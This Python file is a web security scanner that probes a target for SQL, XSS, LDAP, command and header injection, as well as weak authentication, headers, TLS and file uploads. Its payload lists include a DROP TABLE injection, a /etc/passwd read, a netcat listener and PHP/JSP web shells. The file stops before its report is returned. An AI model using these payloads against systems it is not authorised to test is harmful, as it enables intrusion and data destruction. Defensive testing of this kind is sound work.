"""
Comprehensive Security Testing Suite
Production-ready penetration testing and security validation.
"""

import asyncio
import base64
import hashlib
import json
import logging
import random
import re
import ssl
import string
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, Tuple, Union
from urllib.parse import urlparse, urljoin

import aiohttp
import jwt
import pytest
import requests
from cryptography.fernet import Fernet
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


# ============================================================================
# Security Test Configuration
# ============================================================================

class SecurityTestConfig:
    """Configuration for security tests."""
    
    def __init__(self, base_url: str):
        """Initialize security test configuration."""
        self.base_url = base_url.rstrip('/')
        self.timeout = 30
        self.max_retries = 3
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        # Test credentials
        self.test_username = "security_test_user"
        self.test_password = "SecureTestPassword123!"
        self.admin_username = "admin_test"
        self.admin_password = "AdminTestPassword123!"
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "' OR 'x'='x",
            "1' AND '1'='1",
            "1' OR '1'='1' ORDER BY 1--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        # LDAP Injection payloads
        self.ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*",
            "*)(|(uid=*))",
            "*)(|(objectClass=*))",
            "admin)(&(password=*))"
        ]
        
        # Command injection payloads
        self.command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| nc -l -p 4444"
        ]


# ============================================================================
# Security Test Framework
# ============================================================================

class SecurityTestResult:
    """Result of a security test."""
    
    def __init__(
        self,
        test_name: str,
        vulnerability_type: str,
        severity: str,
        passed: bool,
        details: str,
        remediation: str = "",
        evidence: Dict[str, Any] = None
    ):
        self.test_name = test_name
        self.vulnerability_type = vulnerability_type
        self.severity = severity
        self.passed = passed
        self.details = details
        self.remediation = remediation
        self.evidence = evidence or {}
        self.timestamp = datetime.utcnow()


class SecurityTester:
    """Comprehensive security testing framework."""
    
    def __init__(self, config: SecurityTestConfig):
        """Initialize security tester."""
        self.config = config
        self.session = requests.Session()
        self.results: List[SecurityTestResult] = []
        
        # Configure session with retries
        retry_strategy = Retry(
            total=self.config.max_retries,
            status_forcelist=[429, 500, 502, 503, 504],
            backoff_factor=1
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set default headers
        self.session.headers.update({
            'User-Agent': random.choice(self.config.user_agents)
        })
        
        logger.info(f"Security tester initialized for {self.config.base_url}")
    
    def add_result(self, result: SecurityTestResult):
        """Add a test result."""
        self.results.append(result)
        
        severity_emoji = {
            "critical": "🚨",
            "high": "❗",
            "medium": "⚠️",
            "low": "📝",
            "info": "ℹ️"
        }
        
        status = "✅ PASS" if result.passed else "❌ FAIL"
        emoji = severity_emoji.get(result.severity, "")
        
        logger.info(f"{status} {emoji} {result.test_name} ({result.severity})")
        if not result.passed:
            logger.warning(f"  Vulnerability: {result.details}")
    
    # ========================================================================
    # Authentication & Authorization Tests
    # ========================================================================
    
    def test_authentication_security(self) -> List[SecurityTestResult]:
        """Test authentication security."""
        results = []
        
        # Test 1: Weak password policy
        results.append(self._test_weak_password_policy())
        
        # Test 2: Brute force protection
        results.append(self._test_brute_force_protection())
        
        # Test 3: JWT security
        results.append(self._test_jwt_security())
        
        # Test 4: Session security
        results.append(self._test_session_security())
        
        # Test 5: Multi-factor authentication bypass
        results.append(self._test_mfa_bypass())
        
        return results
    
    def _test_weak_password_policy(self) -> SecurityTestResult:
        """Test password policy enforcement."""
        weak_passwords = ["123", "password", "admin", "test", "123456789"]
        
        for weak_password in weak_passwords:
            try:
                response = self.session.post(
                    f"{self.config.base_url}/api/auth/register",
                    json={
                        "username": f"weaktest_{random.randint(1000, 9999)}",
                        "password": weak_password,
                        "email": "weaktest@example.com"
                    },
                    timeout=self.config.timeout
                )
                
                if response.status_code == 200 or response.status_code == 201:
                    return SecurityTestResult(
                        test_name="Weak Password Policy",
                        vulnerability_type="Authentication",
                        severity="medium",
                        passed=False,
                        details=f"System accepts weak password: '{weak_password}'",
                        remediation="Implement strong password policy with minimum complexity requirements",
                        evidence={"weak_password": weak_password, "response": response.text}
                    )
            except requests.exceptions.RequestException:
                pass
        
        return SecurityTestResult(
            test_name="Weak Password Policy",
            vulnerability_type="Authentication",
            severity="info",
            passed=True,
            details="Password policy appears to reject weak passwords"
        )
    
    def _test_brute_force_protection(self) -> SecurityTestResult:
        """Test brute force protection mechanisms."""
        # Attempt multiple failed logins
        failed_attempts = 0
        max_attempts = 10
        
        for i in range(max_attempts):
            try:
                response = self.session.post(
                    f"{self.config.base_url}/api/auth/login",
                    json={
                        "username": "nonexistent_user",
                        "password": f"wrong_password_{i}"
                    },
                    timeout=self.config.timeout
                )
                
                if response.status_code == 401:
                    failed_attempts += 1
                elif response.status_code == 429:
                    # Rate limiting detected
                    return SecurityTestResult(
                        test_name="Brute Force Protection",
                        vulnerability_type="Authentication",
                        severity="info",
                        passed=True,
                        details=f"Rate limiting activated after {failed_attempts} attempts",
                        evidence={"attempts_before_rate_limit": failed_attempts}
                    )
                
                time.sleep(0.1)  # Small delay between attempts
                
            except requests.exceptions.RequestException:
                break
        
        if failed_attempts >= max_attempts:
            return SecurityTestResult(
                test_name="Brute Force Protection",
                vulnerability_type="Authentication",
                severity="high",
                passed=False,
                details=f"No rate limiting detected after {max_attempts} failed login attempts",
                remediation="Implement account lockout or rate limiting after failed login attempts",
                evidence={"total_attempts": failed_attempts}
            )
        
        return SecurityTestResult(
            test_name="Brute Force Protection",
            vulnerability_type="Authentication",
            severity="info",
            passed=True,
            details="Brute force protection appears to be in place"
        )
    
    def _test_jwt_security(self) -> SecurityTestResult:
        """Test JWT token security."""
        try:
            # First, try to get a valid token
            login_response = self.session.post(
                f"{self.config.base_url}/api/auth/login",
                json={
                    "username": self.config.test_username,
                    "password": self.config.test_password
                }
            )
            
            if login_response.status_code != 200:
                return SecurityTestResult(
                    test_name="JWT Security",
                    vulnerability_type="Authentication",
                    severity="info",
                    passed=True,
                    details="Could not obtain JWT token for testing"
                )
            
            token = login_response.json().get("access_token")
            if not token:
                return SecurityTestResult(
                    test_name="JWT Security",
                    vulnerability_type="Authentication",
                    severity="info",
                    passed=True,
                    details="No JWT token found in response"
                )
            
            # Test 1: Check if JWT is properly signed
            try:
                # Try to decode without verification
                decoded = jwt.decode(token, options={"verify_signature": False})
                
                # Check for weak algorithms
                header = jwt.get_unverified_header(token)
                algorithm = header.get("alg", "").lower()
                
                if algorithm in ["none", "hs256"]:
                    return SecurityTestResult(
                        test_name="JWT Security",
                        vulnerability_type="Authentication",
                        severity="high" if algorithm == "none" else "medium",
                        passed=False,
                        details=f"JWT uses weak algorithm: {algorithm}",
                        remediation="Use stronger signing algorithms like RS256 or ES256",
                        evidence={"algorithm": algorithm, "header": header}
                    )
                
                # Check token expiration
                exp = decoded.get("exp")
                if not exp:
                    return SecurityTestResult(
                        test_name="JWT Security",
                        vulnerability_type="Authentication",
                        severity="medium",
                        passed=False,
                        details="JWT token does not have expiration claim",
                        remediation="Add expiration claim (exp) to JWT tokens",
                        evidence={"decoded_payload": decoded}
                    )
                
                # Check if expiration is too long
                exp_time = datetime.fromtimestamp(exp)
                if exp_time > datetime.utcnow() + timedelta(hours=24):
                    return SecurityTestResult(
                        test_name="JWT Security",
                        vulnerability_type="Authentication",
                        severity="low",
                        passed=False,
                        details="JWT token has very long expiration time",
                        remediation="Use shorter token expiration times",
                        evidence={"expiration": exp_time.isoformat()}
                    )
                
            except jwt.InvalidTokenError:
                pass
            
            return SecurityTestResult(
                test_name="JWT Security",
                vulnerability_type="Authentication",
                severity="info",
                passed=True,
                details="JWT token appears to be properly configured"
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="JWT Security",
                vulnerability_type="Authentication",
                severity="info",
                passed=True,
                details=f"Could not analyze JWT security: {str(e)}"
            )
    
    def _test_session_security(self) -> SecurityTestResult:
        """Test session management security."""
        try:
            # Test session cookie security
            response = self.session.get(f"{self.config.base_url}/api/auth/me")
            
            issues = []
            
            # Check Set-Cookie headers
            for cookie in self.session.cookies:
                if not cookie.secure and self.config.base_url.startswith('https'):
                    issues.append(f"Cookie '{cookie.name}' missing Secure flag")
                
                if not hasattr(cookie, 'HttpOnly') or not cookie.get_nonstandard_attr('HttpOnly'):
                    issues.append(f"Cookie '{cookie.name}' missing HttpOnly flag")
                
                if not hasattr(cookie, 'SameSite'):
                    issues.append(f"Cookie '{cookie.name}' missing SameSite attribute")
            
            if issues:
                return SecurityTestResult(
                    test_name="Session Security",
                    vulnerability_type="Session Management",
                    severity="medium",
                    passed=False,
                    details="; ".join(issues),
                    remediation="Set Secure, HttpOnly, and SameSite flags on session cookies",
                    evidence={"cookie_issues": issues}
                )
            
            return SecurityTestResult(
                test_name="Session Security",
                vulnerability_type="Session Management",
                severity="info",
                passed=True,
                details="Session cookies appear to be properly secured"
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name="Session Security",
                vulnerability_type="Session Management",
                severity="info",
                passed=True,
                details=f"Could not analyze session security: {str(e)}"
            )
    
    def _test_mfa_bypass(self) -> SecurityTestResult:
        """Test for multi-factor authentication bypass."""
        # This is a placeholder - actual implementation would depend on MFA setup
        return SecurityTestResult(
            test_name="MFA Bypass",
            vulnerability_type="Authentication",
            severity="info",
            passed=True,
            details="MFA bypass test not implemented (requires specific MFA setup)"
        )
    
    # ========================================================================
    # Injection Attack Tests
    # ========================================================================
    
    def test_injection_vulnerabilities(self) -> List[SecurityTestResult]:
        """Test for various injection vulnerabilities."""
        results = []
        
        # SQL Injection tests
        results.extend(self._test_sql_injection())
        
        # XSS tests
        results.extend(self._test_xss())
        
        # Command injection tests
        results.append(self._test_command_injection())
        
        # LDAP injection tests
        results.append(self._test_ldap_injection())
        
        # Header injection tests
        results.append(self._test_header_injection())
        
        return results
    
    def _test_sql_injection(self) -> List[SecurityTestResult]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        # Common endpoints to test
        test_endpoints = [
            "/api/documents",
            "/api/users",
            "/api/search",
            "/api/auth/login"
        ]
        
        for endpoint in test_endpoints:
            for payload in self.config.sql_payloads:
                try:
                    # Test GET parameters
                    response = self.session.get(
                        f"{self.config.base_url}{endpoint}",
                        params={"id": payload, "q": payload},
                        timeout=self.config.timeout
                    )
                    
                    if self._is_sql_error_response(response):
                        results.append(SecurityTestResult(
                            test_name=f"SQL Injection - {endpoint} (GET)",
                            vulnerability_type="Injection",
                            severity="critical",
                            passed=False,
                            details=f"SQL injection vulnerability detected with payload: {payload}",
                            remediation="Use parameterized queries and input validation",
                            evidence={
                                "endpoint": endpoint,
                                "payload": payload,
                                "response": response.text[:500]
                            }
                        ))
                    
                    # Test POST data
                    if endpoint != "/api/auth/login":  # Skip login to avoid lockout
                        post_response = self.session.post(
                            f"{self.config.base_url}{endpoint}",
                            json={"data": payload, "search": payload},
                            timeout=self.config.timeout
                        )
                        
                        if self._is_sql_error_response(post_response):
                            results.append(SecurityTestResult(
                                test_name=f"SQL Injection - {endpoint} (POST)",
                                vulnerability_type="Injection",
                                severity="critical",
                                passed=False,
                                details=f"SQL injection vulnerability detected with payload: {payload}",
                                remediation="Use parameterized queries and input validation",
                                evidence={
                                    "endpoint": endpoint,
                                    "payload": payload,
                                    "response": post_response.text[:500]
                                }
                            ))
                
                except requests.exceptions.RequestException:
                    continue
        
        if not results:
            results.append(SecurityTestResult(
                test_name="SQL Injection",
                vulnerability_type="Injection",
                severity="info",
                passed=True,
                details="No SQL injection vulnerabilities detected"
            ))
        
        return results
    
    def _test_xss(self) -> List[SecurityTestResult]:
        """Test for Cross-Site Scripting vulnerabilities."""
        results = []
        
        test_endpoints = [
            "/api/documents",
            "/api/search",
            "/api/comments"
        ]
        
        for endpoint in test_endpoints:
            for payload in self.config.xss_payloads:
                try:
                    # Test reflected XSS
                    response = self.session.get(
                        f"{self.config.base_url}{endpoint}",
                        params={"q": payload, "message": payload},
                        timeout=self.config.timeout
                    )
                    
                    if self._is_xss_vulnerable_response(response, payload):
                        results.append(SecurityTestResult(
                            test_name=f"Reflected XSS - {endpoint}",
                            vulnerability_type="XSS",
                            severity="high",
                            passed=False,
                            details=f"Reflected XSS vulnerability detected with payload: {payload}",
                            remediation="Implement proper output encoding and Content Security Policy",
                            evidence={
                                "endpoint": endpoint,
                                "payload": payload,
                                "response_snippet": response.text[:500]
                            }
                        ))
                    
                    # Test stored XSS via POST
                    if endpoint in ["/api/documents", "/api/comments"]:
                        post_response = self.session.post(
                            f"{self.config.base_url}{endpoint}",
                            json={"content": payload, "title": payload},
                            timeout=self.config.timeout
                        )
                        
                        # Check if the payload is reflected in the response
                        if self._is_xss_vulnerable_response(post_response, payload):
                            results.append(SecurityTestResult(
                                test_name=f"Stored XSS - {endpoint}",
                                vulnerability_type="XSS",
                                severity="critical",
                                passed=False,
                                details=f"Stored XSS vulnerability detected with payload: {payload}",
                                remediation="Implement proper input validation and output encoding",
                                evidence={
                                    "endpoint": endpoint,
                                    "payload": payload,
                                    "response_snippet": post_response.text[:500]
                                }
                            ))
                
                except requests.exceptions.RequestException:
                    continue
        
        if not results:
            results.append(SecurityTestResult(
                test_name="Cross-Site Scripting (XSS)",
                vulnerability_type="XSS",
                severity="info",
                passed=True,
                details="No XSS vulnerabilities detected"
            ))
        
        return results
    
    def _test_command_injection(self) -> SecurityTestResult:
        """Test for command injection vulnerabilities."""
        test_endpoints = [
            "/api/system/status",
            "/api/documents/convert",
            "/api/utils/ping"
        ]
        
        for endpoint in test_endpoints:
            for payload in self.config.command_payloads:
                try:
                    response = self.session.post(
                        f"{self.config.base_url}{endpoint}",
                        json={"command": payload, "input": payload},
                        timeout=self.config.timeout
                    )
                    
                    if self._is_command_injection_response(response):
                        return SecurityTestResult(
                            test_name="Command Injection",
                            vulnerability_type="Injection",
                            severity="critical",
                            passed=False,
                            details=f"Command injection vulnerability detected at {endpoint}",
                            remediation="Avoid executing system commands with user input",
                            evidence={
                                "endpoint": endpoint,
                                "payload": payload,
                                "response": response.text[:500]
                            }
                        )
                
                except requests.exceptions.RequestException:
                    continue
        
        return SecurityTestResult(
            test_name="Command Injection",
            vulnerability_type="Injection",
            severity="info",
            passed=True,
            details="No command injection vulnerabilities detected"
        )
    
    def _test_ldap_injection(self) -> SecurityTestResult:
        """Test for LDAP injection vulnerabilities."""
        # Test LDAP injection in authentication
        for payload in self.config.ldap_payloads:
            try:
                response = self.session.post(
                    f"{self.config.base_url}/api/auth/ldap",
                    json={"username": payload, "password": "test"},
                    timeout=self.config.timeout
                )
                
                if self._is_ldap_error_response(response):
                    return SecurityTestResult(
                        test_name="LDAP Injection",
                        vulnerability_type="Injection",
                        severity="high",
                        passed=False,
                        details=f"LDAP injection vulnerability detected with payload: {payload}",
                        remediation="Use proper LDAP query escaping and input validation",
                        evidence={"payload": payload, "response": response.text[:500]}
                    )
            
            except requests.exceptions.RequestException:
                continue
        
        return SecurityTestResult(
            test_name="LDAP Injection",
            vulnerability_type="Injection",
            severity="info",
            passed=True,
            details="No LDAP injection vulnerabilities detected or LDAP not in use"
        )
    
    def _test_header_injection(self) -> SecurityTestResult:
        """Test for HTTP header injection vulnerabilities."""
        malicious_headers = {
            "X-Forwarded-Host": "evil.com",
            "Host": "evil.com",
            "X-Forwarded-For": "127.0.0.1\r\nSet-Cookie: evil=1",
            "User-Agent": "test\r\nSet-Cookie: evil=1"
        }
        
        for header_name, header_value in malicious_headers.items():
            try:
                headers = {header_name: header_value}
                response = self.session.get(
                    f"{self.config.base_url}/api/health",
                    headers=headers,
                    timeout=self.config.timeout
                )
                
                # Check if malicious content is reflected in response headers
                for resp_header_name, resp_header_value in response.headers.items():
                    if "evil" in resp_header_value.lower() or "\r\n" in resp_header_value:
                        return SecurityTestResult(
                            test_name="Header Injection",
                            vulnerability_type="Injection",
                            severity="medium",
                            passed=False,
                            details=f"Header injection vulnerability detected via {header_name}",
                            remediation="Validate and sanitize HTTP headers",
                            evidence={
                                "injected_header": header_name,
                                "injected_value": header_value,
                                "response_headers": dict(response.headers)
                            }
                        )
            
            except requests.exceptions.RequestException:
                continue
        
        return SecurityTestResult(
            test_name="Header Injection",
            vulnerability_type="Injection",
            severity="info",
            passed=True,
            details="No header injection vulnerabilities detected"
        )
    
    # ========================================================================
    # Security Headers Tests
    # ========================================================================
    
    def test_security_headers(self) -> List[SecurityTestResult]:
        """Test for proper security headers."""
        results = []
        
        try:
            response = self.session.get(f"{self.config.base_url}/")
            headers = response.headers
            
            # Required security headers
            required_headers = {
                "Content-Security-Policy": "critical",
                "X-Content-Type-Options": "medium",
                "X-Frame-Options": "medium",
                "X-XSS-Protection": "medium",
                "Strict-Transport-Security": "high" if self.config.base_url.startswith('https') else "info",
                "Referrer-Policy": "low"
            }
            
            for header, severity in required_headers.items():
                if header not in headers:
                    results.append(SecurityTestResult(
                        test_name=f"Missing Security Header - {header}",
                        vulnerability_type="Security Headers",
                        severity=severity,
                        passed=False,
                        details=f"Missing security header: {header}",
                        remediation=f"Add {header} header with appropriate value",
                        evidence={"missing_header": header}
                    ))
                else:
                    # Check header values
                    header_value = headers[header]
                    if header == "X-Content-Type-Options" and header_value != "nosniff":
                        results.append(SecurityTestResult(
                            test_name=f"Weak Security Header - {header}",
                            vulnerability_type="Security Headers",
                            severity="low",
                            passed=False,
                            details=f"Weak {header} value: {header_value}",
                            remediation=f"Set {header}: nosniff",
                            evidence={"header": header, "value": header_value}
                        ))
            
            # Check for information disclosure headers
            disclosure_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]
            for header in disclosure_headers:
                if header in headers:
                    results.append(SecurityTestResult(
                        test_name=f"Information Disclosure - {header}",
                        vulnerability_type="Information Disclosure",
                        severity="low",
                        passed=False,
                        details=f"Server information disclosed in {header}: {headers[header]}",
                        remediation=f"Remove or obfuscate {header} header",
                        evidence={"header": header, "value": headers[header]}
                    ))
            
            if not results:
                results.append(SecurityTestResult(
                    test_name="Security Headers",
                    vulnerability_type="Security Headers",
                    severity="info",
                    passed=True,
                    details="Security headers appear to be properly configured"
                ))
        
        except requests.exceptions.RequestException as e:
            results.append(SecurityTestResult(
                test_name="Security Headers",
                vulnerability_type="Security Headers",
                severity="info",
                passed=True,
                details=f"Could not test security headers: {str(e)}"
            ))
        
        return results
    
    # ========================================================================
    # TLS/SSL Security Tests
    # ========================================================================
    
    def test_tls_security(self) -> List[SecurityTestResult]:
        """Test TLS/SSL security configuration."""
        results = []
        
        if not self.config.base_url.startswith('https'):
            results.append(SecurityTestResult(
                test_name="TLS/SSL Configuration",
                vulnerability_type="Transport Security",
                severity="high",
                passed=False,
                details="Application is not using HTTPS",
                remediation="Enable HTTPS and redirect HTTP traffic to HTTPS"
            ))
            return results
        
        try:
            import ssl
            import socket
            from urllib.parse import urlparse
            
            parsed_url = urlparse(self.config.base_url)
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Test SSL/TLS configuration
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=self.config.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Check TLS version
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        results.append(SecurityTestResult(
                            test_name="Weak TLS Version",
                            vulnerability_type="Transport Security",
                            severity="high",
                            passed=False,
                            details=f"Weak TLS version in use: {version}",
                            remediation="Use TLS 1.2 or higher",
                            evidence={"tls_version": version}
                        ))
                    
                    # Check cipher strength
                    if cipher and len(cipher) >= 3:
                        cipher_name = cipher[0]
                        if any(weak in cipher_name.upper() for weak in ['DES', 'RC4', 'MD5', 'NULL']):
                            results.append(SecurityTestResult(
                                test_name="Weak Cipher Suite",
                                vulnerability_type="Transport Security",
                                severity="medium",
                                passed=False,
                                details=f"Weak cipher suite: {cipher_name}",
                                remediation="Use strong cipher suites",
                                evidence={"cipher": cipher}
                            ))
                    
                    # Check certificate validity
                    if cert:
                        import datetime
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_until_expiry = (not_after - datetime.datetime.utcnow()).days
                        
                        if days_until_expiry < 30:
                            results.append(SecurityTestResult(
                                test_name="Certificate Expiry",
                                vulnerability_type="Transport Security",
                                severity="medium" if days_until_expiry > 0 else "high",
                                passed=False,
                                details=f"Certificate expires in {days_until_expiry} days",
                                remediation="Renew SSL certificate",
                                evidence={"expiry_date": cert['notAfter'], "days_remaining": days_until_expiry}
                            ))
            
            if not results:
                results.append(SecurityTestResult(
                    test_name="TLS/SSL Configuration",
                    vulnerability_type="Transport Security",
                    severity="info",
                    passed=True,
                    details="TLS/SSL configuration appears secure"
                ))
        
        except Exception as e:
            results.append(SecurityTestResult(
                test_name="TLS/SSL Configuration",
                vulnerability_type="Transport Security",
                severity="info",
                passed=True,
                details=f"Could not test TLS configuration: {str(e)}"
            ))
        
        return results
    
    # ========================================================================
    # Business Logic Tests
    # ========================================================================
    
    def test_business_logic_flaws(self) -> List[SecurityTestResult]:
        """Test for business logic vulnerabilities."""
        results = []
        
        # Test privilege escalation
        results.append(self._test_privilege_escalation())
        
        # Test file upload security
        results.append(self._test_file_upload_security())
        
        # Test rate limiting
        results.append(self._test_rate_limiting())
        
        # Test IDOR (Insecure Direct Object References)
        results.append(self._test_idor())
        
        return results
    
    def _test_privilege_escalation(self) -> SecurityTestResult:
        """Test for privilege escalation vulnerabilities."""
        try:
            # Try to access admin endpoints without proper authorization
            admin_endpoints = [
                "/api/admin/users",
                "/api/admin/settings",
                "/api/admin/logs"
            ]
            
            for endpoint in admin_endpoints:
                response = self.session.get(f"{self.config.base_url}{endpoint}")
                
                if response.status_code == 200:
                    return SecurityTestResult(
                        test_name="Privilege Escalation",
                        vulnerability_type="Authorization",
                        severity="critical",
                        passed=False,
                        details=f"Admin endpoint accessible without authentication: {endpoint}",
                        remediation="Implement proper authorization checks for admin endpoints",
                        evidence={"endpoint": endpoint, "status_code": response.status_code}
                    )
            
            return SecurityTestResult(
                test_name="Privilege Escalation",
                vulnerability_type="Authorization",
                severity="info",
                passed=True,
                details="No privilege escalation vulnerabilities detected"
            )
        
        except Exception:
            return SecurityTestResult(
                test_name="Privilege Escalation",
                vulnerability_type="Authorization",
                severity="info",
                passed=True,
                details="Could not test privilege escalation"
            )
    
    def _test_file_upload_security(self) -> SecurityTestResult:
        """Test file upload security."""
        try:
            # Create a malicious file
            malicious_files = [
                ("malicious.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
                ("malicious.jsp", b"<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "application/x-jsp"),
                ("malicious.exe", b"MZ\x90\x00", "application/x-executable")
            ]
            
            for filename, content, content_type in malicious_files:
                files = {'file': (filename, content, content_type)}
                
                response = self.session.post(
                    f"{self.config.base_url}/api/documents/upload",
                    files=files
                )
                
                if response.status_code == 200 or response.status_code == 201:
                    return SecurityTestResult(
                        test_name="File Upload Security",
                        vulnerability_type="File Upload",
                        severity="critical",
                        passed=False,
                        details=f"Malicious file upload allowed: {filename}",
                        remediation="Implement file type validation and content scanning",
                        evidence={"filename": filename, "content_type": content_type}
                    )
            
            return SecurityTestResult(
                test_name="File Upload Security",
                vulnerability_type="File Upload",
                severity="info",
                passed=True,
                details="File upload appears to have proper restrictions"
            )
        
        except Exception:
            return SecurityTestResult(
                test_name="File Upload Security",
                vulnerability_type="File Upload",
                severity="info",
                passed=True,
                details="Could not test file upload security"
            )
    
    def _test_rate_limiting(self) -> SecurityTestResult:
        """Test API rate limiting."""
        try:
            # Make rapid requests to test rate limiting
            endpoint = f"{self.config.base_url}/api/health"
            requests_made = 0
            rate_limited = False
            
            for i in range(100):  # Try 100 requests
                response = self.session.get(endpoint)
                requests_made += 1
                
                if response.status_code == 429:  # Too Many Requests
                    rate_limited = True
                    break
                
                time.sleep(0.01)  # Small delay
            
            if not rate_limited:
                return SecurityTestResult(
                    test_name="Rate Limiting",
                    vulnerability_type="Business Logic",
                    severity="medium",
                    passed=False,
                    details=f"No rate limiting detected after {requests_made} requests",
                    remediation="Implement API rate limiting",
                    evidence={"requests_made": requests_made}
                )
            
            return SecurityTestResult(
                test_name="Rate Limiting",
                vulnerability_type="Business Logic",
                severity="info",
                passed=True,
                details=f"Rate limiting activated after {requests_made} requests"
            )
        
        except Exception:
            return SecurityTestResult(
                test_name="Rate Limiting",
                vulnerability_type="Business Logic",
                severity="info",
                passed=True,
                details="Could not test rate limiting"
            )
    
    def _test_idor(self) -> SecurityTestResult:
        """Test for Insecure Direct Object References."""
        try:
            # Test accessing other users' resources
            test_ids = [1, 2, 3, 100, 999, -1, 0]
            
            for user_id in test_ids:
                response = self.session.get(f"{self.config.base_url}/api/users/{user_id}")
                
                if response.status_code == 200:
                    # Check if we can access other users' data
                    data = response.json()
                    if isinstance(data, dict) and 'id' in data and data['id'] != user_id:
                        return SecurityTestResult(
                            test_name="Insecure Direct Object Reference",
                            vulnerability_type="Authorization",
                            severity="high",
                            passed=False,
                            details=f"Can access other users' data via /api/users/{user_id}",
                            remediation="Implement proper authorization checks for object access",
                            evidence={"user_id": user_id, "response": data}
                        )
            
            return SecurityTestResult(
                test_name="Insecure Direct Object Reference",
                vulnerability_type="Authorization",
                severity="info",
                passed=True,
                details="No IDOR vulnerabilities detected"
            )
        
        except Exception:
            return SecurityTestResult(
                test_name="Insecure Direct Object Reference",
                vulnerability_type="Authorization",
                severity="info",
                passed=True,
                details="Could not test IDOR vulnerabilities"
            )
    
    # ========================================================================
    # Helper Methods
    # ========================================================================
    
    def _is_sql_error_response(self, response: requests.Response) -> bool:
        """Check if response contains SQL error messages."""
        if response.status_code >= 500:
            return True
        
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "postgresql",
            "sqlserver",
            "sqlite",
            "database error",
            "sql error",
            "invalid query"
        ]
        
        content = response.text.lower()
        return any(error in content for error in sql_errors)
    
    def _is_xss_vulnerable_response(self, response: requests.Response, payload: str) -> bool:
        """Check if response reflects XSS payload."""
        # Simple check - in a real scenario, this would be more sophisticated
        return payload in response.text and response.headers.get('content-type', '').startswith('text/html')
    
    def _is_command_injection_response(self, response: requests.Response) -> bool:
        """Check if response indicates command injection."""
        command_indicators = [
            "uid=",
            "gid=",
            "total",  # from ls -la
            "/bin/",
            "root:",
            "daemon:",
            "Permission denied"
        ]
        
        content = response.text.lower()
        return any(indicator in content for indicator in command_indicators)
    
    def _is_ldap_error_response(self, response: requests.Response) -> bool:
        """Check if response contains LDAP error messages."""
        ldap_errors = [
            "ldap",
            "directory",
            "invalid dn",
            "bad search filter"
        ]
        
        content = response.text.lower()
        return any(error in content for error in ldap_errors)
    
    # ========================================================================
    # Test Execution and Reporting
    # ========================================================================
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests and return comprehensive report."""
        logger.info("Starting comprehensive security test suite")
        start_time = time.time()
        
        test_categories = [
            ("Authentication & Authorization", self.test_authentication_security),
            ("Injection Vulnerabilities", self.test_injection_vulnerabilities),
            ("Security Headers", self.test_security_headers),
            ("TLS/SSL Security", self.test_tls_security),
            ("Business Logic Flaws", self.test_business_logic_flaws)
        ]
        
        all_results = []
        
        for category_name, test_method in test_categories:
            logger.info(f"Running {category_name} tests...")
            try:
                category_results = test_method()
                if isinstance(category_results, list):
                    all_results.extend(category_results)
                else:
                    all_results.append(category_results)
                    
                for result in (category_results if isinstance(category_results, list) else [category_results]):
                    self.add_result(result)
                    
            except Exception as e:
                logger.error(f"Error running {category_name} tests: {e}")
                error_result = SecurityTestResult(
                    test_name=f"{category_name} - Test Error",
                    vulnerability_type="Test Framework",
                    severity="info",
                    passed=True,
                    details=f"Test execution error: {str(e)}"
                )
                all_results.append(error_result)
                self.add_result(error_result)
        
        # Generate report
        execution_time = time.time() - start_time
        
        # Count results by severity
        severity_counts = {}
        for result in self.results:
            if not result.passed:
                severity_counts[result.severity] = severity_counts.get(result.severity, 0) + 1
        
        total_tests = len(self.results)
        failed_tests = sum(1 for r in self.results if not r.passed)
        passed_tests = total_tests - failed_tests
        
        report = {
            "summary": {
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": failed_tests,
                "execution_time": f"{execution_time:.2f}s",
                "target": self.config.base_url,
                "timestamp": datetime.utcnow().isoformat()
            },
            "vulnerability_summary": {
                "critical": severity_counts.get("critical", 0),
                "high": severity_counts.get("high", 0),
                "medium": severity_counts.get("medium", 0),
                "low": severity_counts.get("low", 0)
            },
            "detailed_results": [
                {
                    "test_name": result.test_name,
                    "vulnerability_type": result.vulnerability_type,
                    "severity": result.severity,
                    "status": "PASS" if result.passed else "FAIL",
                    "details": result.details,
                    "remediation": result.remediation,
                    "evidence": result.evidence,
                    "timestamp": result.timestamp.isoformat()
                }
                for result in self.results
                if not result.passed  # Only include failed tests in detailed results
            ]
        }
        
        logger.info(f"Security test suite completed in {execution_time:.2f}s")
